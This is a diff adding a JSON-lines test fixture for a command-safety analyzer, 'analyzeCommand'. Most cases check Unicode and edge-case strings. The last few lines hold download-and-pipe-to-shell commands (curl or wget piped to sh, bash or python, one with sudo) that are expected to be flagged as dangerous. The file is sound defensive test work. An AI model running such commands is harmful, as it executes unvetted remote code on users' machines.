@@ -1,0 +1,265 @@
+{"fn":"analyzeCommand","args":["日本語のテキスト",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ab",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["tab\tseparated",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["😀",["hello  padded  ","ns:key.path"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["Hello Worldab",["İstanbul😀"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["İstanbul"],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["emoji 👍🏽 mix",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["",["İstanbul"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["hello world",["ΣΊΣΥΦΟΣ","ns:key.path","{name} has {count} items"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":[":",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["key_name-1日本語のテキスト",["a.b.cHello World"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ns:key.path",["ns:key.path"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":[".leading",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["😀",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["{name} has {count} items",["ab",""]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":[".leading",[".leading"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ünïcödé",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["Hello World"],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ΣΊΣΥΦΟΣ",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["﻿bom",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["{name} has {count} items",[".leading","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["./x/**/*.json",["hello","abcΣΊΣΥΦΟΣ","ΣΊΣΥΦΟΣ"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["hello"],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a:b:c",["key_name-1","hello","abc"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ns:key.path",[""]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":[".leading",["a:b:c","é","a😀b😀c"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a..ba",["Hello World.leading"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["hello world",["abc","ünïcödéns:key.path","hello world"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["é",["straßehello","İstanbulstraße"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["trailing.",["tab\tseparated:","a{name} has {count} items","a"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["abc"],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["trailing.a😀b😀c",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["line1\nline2",["Hello World","ns:key.pathline1\nline2","straße"]],"ok":{"level":"danger","findings":[{"rule":"shell-newline","reason":"命令里有换行 —— 换行后面可能藏着另一条命令"}]}}
+{"fn":"analyzeCommand","args":["ns:key.path",["a:b:c","İstanbul","abc"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["hello worldhello world"],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["😀",["ünïcödé"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ünïcödé",["abc","ns:key.path","ünïcödé"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["line1\nline2",[]],"ok":{"level":"danger","findings":[{"rule":"shell-newline","reason":"命令里有换行 —— 换行后面可能藏着另一条命令"}]}}
+{"fn":"analyzeCommand","args":["./x/**/*.json./x/**/*.json"],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["key_name-1",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["abc",["key_name-1"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a",["key_name-1"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["Hello Worldstraße",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ΣΊΣΥΦΟΣ",["{name} has {count} items.leading","trailing.","a..b"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["./x/**/*.jsonkey_name-1",["a.leading","a😀b😀ca","key_name-1İstanbul"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["trailing."],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ns:key.path",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["trailing.",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ns:key.path"],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["﻿bom",["a:b:c.leading"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["./x/**/*.json",["key_name-1{name} has {count} items","ns:key.path"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["﻿bom",["src/a/b.ts","a..b"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["😀",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["./x/**/*.json",[".leading"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a..b",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":[":",["a😀b😀cHELLO","é","İstanbul"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["{name} has {count} items",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["emoji 👍🏽 mix"],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":[":",[":","tab\tseparated","Hello World:"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["trailing.",["a..b"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a:b:c",["ünïcödé","Hello World"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["HELLO",["  padded  ",".leading"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ΣΊΣΥΦΟΣ",["hello world","hello world"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a..b",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a😀b😀c",[".leading","ünïcödé"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["HELLO",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ΣΊΣΥΦΟΣline1\nline2",{"$undefined":true}],"ok":{"level":"danger","findings":[{"rule":"shell-newline","reason":"命令里有换行 —— 换行后面可能藏着另一条命令"}]}}
+{"fn":"analyzeCommand","args":["a.b.c"],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":[":",["😀","a.b.ca.b.c"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["src/a/b.ts",["ünïcödé","ΣΊΣΥΦΟΣa.b.c"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["é"],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["İstanbul",["straßea.b.c","a"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["./x/**/*.json",["src/a/b.ts","日本語のテキスト"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":[".leading",["./x/**/*.json","abcΣΊΣΥΦΟΣ","tab\tseparated"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["é",["HELLOemoji 👍🏽 mix","hello"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["key_name-1",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["İstanbul",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ΣΊΣΥΦΟΣ",["src/a/b.ts"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["src/a/b.ts",["tab\tseparated","a..b"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a",["key_name-1","abc"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["tab\tseparated",["﻿bom",".leading","é"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["tab\tseparated"],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":[".leadinga:b:c",[":","  padded  ","a😀b😀c"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":[".leadingsrc/a/b.ts",[""]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["  padded  "],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a.b.c😀",[".leadingline1\nline2"]],"ok":{"level":"danger","findings":[{"rule":"shell-newline","reason":"命令里有换行 —— 换行后面可能藏着另一条命令"}]}}
+{"fn":"analyzeCommand","args":["a",["abc","abc","abc"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ünïcödé",["é  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["src/a/b.ts",["😀","{name} has {count} itemsHello World","hello"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ΣΊΣΥΦΟΣ",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["HELLO{name} has {count} items",["line1\nline2",":"]],"ok":{"level":"danger","findings":[{"rule":"shell-newline","reason":"命令里有换行 —— 换行后面可能藏着另一条命令"}]}}
+{"fn":"analyzeCommand","args":["helloa😀b😀c",["tab\tseparated","emoji 👍🏽 mix","ns:key.path"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["{name} has {count} items",["a😀b😀c","  padded  ","ab"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["trailing.",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ΣΊΣΥΦΟΣ"],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ΣΊΣΥΦΟΣ",["﻿bom"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["key_name-1a..b",[".leadinga:b:c"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":[".leading",[""]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["./x/**/*.json",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["😀é",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["line1\nline2",["İstanbul",".leading","  padded  "]],"ok":{"level":"danger","findings":[{"rule":"shell-newline","reason":"命令里有换行 —— 换行后面可能藏着另一条命令"}]}}
+{"fn":"analyzeCommand","args":["ab",["HELLO","src/a/b.ts"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["straße",["HELLOhello","é","{name} has {count} itemssrc/a/b.ts"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ünïcödé"],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["é",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a😀b😀c",["ünïcödé","straße","src/a/b.ts./x/**/*.json"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["😀",["ns:key.path"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ünïcödéa.b.c",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["HELLOtab\tseparated",["a"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["atrailing.",["日本語のテキスト","ΣΊΣΥΦΟΣ","﻿bom"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a",["a😀b😀csrc/a/b.ts"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a..b",["﻿bom","日本語のテキスト日本語のテキスト"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["",["./x/**/*.json","a.b.c","src/a/b.tstab\tseparated"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["﻿bom",[".leading{name} has {count} items","","日本語のテキスト"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["straße",[""]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["",["a..b","key_name-1  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["é",["hello","ab","a:b:c"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["HELLO",["Hello World"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["  padded  ",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":[":",[".leading","line1\nline2"]],"ok":{"level":"danger","findings":[{"rule":"shell-newline","reason":"命令里有换行 —— 换行后面可能藏着另一条命令"}]}}
+{"fn":"analyzeCommand","args":["trailing.",[".leadingline1\nline2","tab\tseparated","a..b"]],"ok":{"level":"danger","findings":[{"rule":"shell-newline","reason":"命令里有换行 —— 换行后面可能藏着另一条命令"}]}}
+{"fn":"analyzeCommand","args":["İstanbul",["ns:key.path","src/a/b.ts"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["日本語のテキスト",["src/a/b.tsabc","ab","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["HELLO",[".leading"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["İstanbul",["src/a/b.ts"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a.b.chello world",["  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["abc",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["line1\nline2",["emoji 👍🏽 mixa..b","tab\tseparated"]],"ok":{"level":"danger","findings":[{"rule":"shell-newline","reason":"命令里有换行 —— 换行后面可能藏着另一条命令"}]}}
+{"fn":"analyzeCommand","args":[".leading",[".leadingtrailing.",".leading"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["😀é",["straßeabc"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["key_name-1",["a.b.c"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["trailing.ünïcödé",["HELLO","ab"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["﻿boma..b",["a"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["abc",["HELLO",":","straßea:b:c"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["emoji 👍🏽 mix",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["{name} has {count} items",["src/a/b.tsünïcödé","ΣΊΣΥΦΟΣ"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["HELLO",["İstanbulhello world","trailing.","ΣΊΣΥΦΟΣa.b.c"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ΣΊΣΥΦΟΣ",[".leadingHELLO","ΣΊΣΥΦΟΣ","key_name-1"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["Hello World",["İstanbulHELLO","./x/**/*.jsonHello World","﻿bom"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["  padded  ",[":","straße"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["HELLOa..b"],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["hello",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["emoji 👍🏽 mix",["a","a.b.c","./x/**/*.json"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["hello",["HELLO﻿bom","ünïcödé"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a.b.c",["tab\tseparated"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["日本語のテキスト",["aabc"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ünïcödé",["é","ΣΊΣΥΦΟΣ","src/a/b.ts"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["abc",["İstanbul","line1\nline2﻿bom"]],"ok":{"level":"danger","findings":[{"rule":"shell-newline","reason":"命令里有换行 —— 换行后面可能藏着另一条命令"}]}}
+{"fn":"analyzeCommand","args":["a..b:",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["helloemoji 👍🏽 mix",["ns:key.patha","src/a/b.tsa:b:c"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["abc",["./x/**/*.json","😀"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["hello worldé",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ns:key.path",["{name} has {count} items","hello","line1\nline2"]],"ok":{"level":"danger","findings":[{"rule":"shell-newline","reason":"命令里有换行 —— 换行后面可能藏着另一条命令"}]}}
+{"fn":"analyzeCommand","args":["ab./x/**/*.json",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["./x/**/*.json",["ab","﻿bom"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a..b"],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["日本語のテキスト",["key_name-1src/a/b.ts"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["straßeab",["abc","ΣΊΣΥΦΟΣ","tab\tseparated"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["tab\tseparatedline1\nline2",{"$undefined":true}],"ok":{"level":"danger","findings":[{"rule":"shell-newline","reason":"命令里有换行 —— 换行后面可能藏着另一条命令"}]}}
+{"fn":"analyzeCommand","args":["a.b.cabc",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["HELLO",["line1\nline2key_name-1"]],"ok":{"level":"danger","findings":[{"rule":"shell-newline","reason":"命令里有换行 —— 换行后面可能藏着另一条命令"}]}}
+{"fn":"analyzeCommand","args":[".leading",["  padded  😀","src/a/b.ts"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["abstraße",["HELLO{name} has {count} items","hello","ab"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["日本語のテキストemoji 👍🏽 mix"],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ΣΊΣΥΦΟΣa:b:c",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ns:key.patha..b",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["hello world",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["line1\nline2",["日本語のテキスト","  padded  ","a:b:c"]],"ok":{"level":"danger","findings":[{"rule":"shell-newline","reason":"命令里有换行 —— 换行后面可能藏着另一条命令"}]}}
+{"fn":"analyzeCommand","args":["straße",["İstanbul","a:b:c",":"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["straße",["😀","ΣΊΣΥΦΟΣ"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a😀b😀c",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["straße",[":","Hello World"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["line1\nline2",["ns:key.path","emoji 👍🏽 mix"]],"ok":{"level":"danger","findings":[{"rule":"shell-newline","reason":"命令里有换行 —— 换行后面可能藏着另一条命令"}]}}
+{"fn":"analyzeCommand","args":["😀",["abc"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["tab\tseparated",["src/a/b.ts"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["  padded  ",["./x/**/*.json","helloab","emoji 👍🏽 mix"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["{name} has {count} items",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["straße",["a:b:c"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["tab\tseparated",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["src/a/b.ts",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["./x/**/*.json",["Hello World","ΣΊΣΥΦΟΣ./x/**/*.json","﻿bom"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ünïcödé",["trailing.","src/a/b.ts"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["src/a/b.ts",["key_name-1"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":[":trailing.",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["tab\tseparated:",["日本語のテキスト"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a😀b😀c",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ünïcödé",["ΣΊΣΥΦΟΣ"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["日本語のテキスト",["straße","hello world日本語のテキスト"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a..ba:b:c",["emoji 👍🏽 mix","a.b.c"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":[".leading",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a:b:c",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["{name} has {count} items",["{name} has {count} items","straße","abc"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["",["hello"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a:b:c",[".leadingemoji 👍🏽 mix","é"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":[".leadingstraße",["ab"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["﻿bom"],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a😀b😀c",["  padded  ","line1\nline2","ünïcödé"]],"ok":{"level":"danger","findings":[{"rule":"shell-newline","reason":"命令里有换行 —— 换行后面可能藏着另一条命令"}]}}
+{"fn":"analyzeCommand","args":["héllo wörld",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["👍🏽 thumbs",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["日本語",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["é",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["İstanbul",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["straße",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ılık ırmak",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["👨‍👩‍👧 family",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a b",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ΣΊΣΥΦΟΣ",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a😀b",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["﻿bom",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["Iı İi",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["K K k",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ſ s S",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["x‍y 👨‍👩‍👧",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["a b c　d",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["١٢٣ ٤٥",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["𝟘𝟙 ²³",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["snake_case foo-bar o'neil",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ǅungla Ǆ",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["one\r\ntwo threefour",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"danger","findings":[{"rule":"shell-newline","reason":"命令里有换行 —— 换行后面可能藏着另一条命令"}]}}
+{"fn":"analyzeCommand","args":["café café",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["ΣΑΣ σας ς",["日本語のテキスト","﻿bom","  padded  "]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["日本語のテキスト",{"$undefined":true}],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["日本語のテキスト",[]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["日本語のテキスト",["b","a","B","é","10","9","a"]],"ok":{"level":"none","findings":[]}}
+{"fn":"analyzeCommand","args":["curl",["https://example.com/x.sh","|","sh"]],"ok":{"level":"danger","findings":[{"rule":"shell-separator","reason":"命令里有命令分隔符（; & |）—— 它会串起多条命令，不止一条"},{"rule":"download-pipe","reason":"下载后直接管道执行 —— 远端内容会在你机器上直接跑"}]}}
+{"fn":"analyzeCommand","args":["curl",["-sL","https://example.com/x.sh","|","bash"]],"ok":{"level":"danger","findings":[{"rule":"shell-separator","reason":"命令里有命令分隔符（; & |）—— 它会串起多条命令，不止一条"},{"rule":"download-pipe","reason":"下载后直接管道执行 —— 远端内容会在你机器上直接跑"}]}}
+{"fn":"analyzeCommand","args":["wget",["http://a/b","|","sudo","sh"]],"ok":{"level":"danger","findings":[{"rule":"shell-separator","reason":"命令里有命令分隔符（; & |）—— 它会串起多条命令，不止一条"},{"rule":"download-pipe","reason":"下载后直接管道执行 —— 远端内容会在你机器上直接跑"},{"rule":"privilege-escalation","reason":"提权执行"}]}}
+{"fn":"analyzeCommand","args":["wget",["http://a/b","|","zsh"]],"ok":{"level":"danger","findings":[{"rule":"shell-separator","reason":"命令里有命令分隔符（; & |）—— 它会串起多条命令，不止一条"},{"rule":"download-pipe","reason":"下载后直接管道执行 —— 远端内容会在你机器上直接跑"}]}}
+{"fn":"analyzeCommand","args":["fetch",["http://a/b","|","python"]],"ok":{"level":"danger","findings":[{"rule":"shell-separator","reason":"命令里有命令分隔符（; & |）—— 它会串起多条命令，不止一条"},{"rule":"download-pipe","reason":"下载后直接管道执行 —— 远端内容会在你机器上直接跑"}]}}
